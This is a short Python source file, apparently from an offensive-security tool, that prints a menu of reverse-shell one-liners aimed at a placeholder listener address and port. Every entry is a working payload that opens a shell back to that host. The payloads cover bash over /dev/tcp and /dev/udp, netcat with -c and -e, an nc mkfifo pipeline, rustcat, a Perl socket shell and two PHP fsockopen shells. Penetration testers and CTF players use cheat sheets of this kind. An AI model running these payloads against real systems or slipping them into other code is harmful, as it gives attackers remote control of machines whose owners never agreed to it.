from src.budu import c

lhost = f"{c.BGREEN}10.10.10.10{c.RESET}"
lport = f"{c.BGREEN}9999{c.RESET}"

def the_list():
    print(f"\n - [{c.BGREEN}Reverse Shell Type{c.RESET}] -\n")
    print("| ID | Reverse Shell   | Preview")
    print("|----|-----------------|---------")
    print(f"| 1  | bash -i TCP     | /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    print(f"| 2  | bash -i UDP     | /bin/bash -i >& /dev/udp/{lhost}/{lport} 0>&1")
    print(f"| 3  | nc -c           | nc -c /bin/bash {lhost} {lport}")
    print(f"| 4  | nc -e           | nc -e /bin/bash {lhost} {lport}")
    print(f"| 5  | nc mkfifo       | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f")
    print(f"| 6  | rustcat         | rcat {lhost} {lport} -r /bin/bash")
    print(f"|----------------------|")
    print(f"|    |                 | perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));")
    print("| 7  | perl            | if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");")
    print("|    |                 | open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'")
    print(f"|----------------------|")
    print(f"| 8  | PHP exec        | php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash <&3 >&3 2>&3\");'")
    print(f"| 9  | PHP shell_exec  | php -r '$sock=fsockopen(\"{lhost}\",{lport});shell_exec(\"/bin/bash <&3 >&3 2>&3\");'")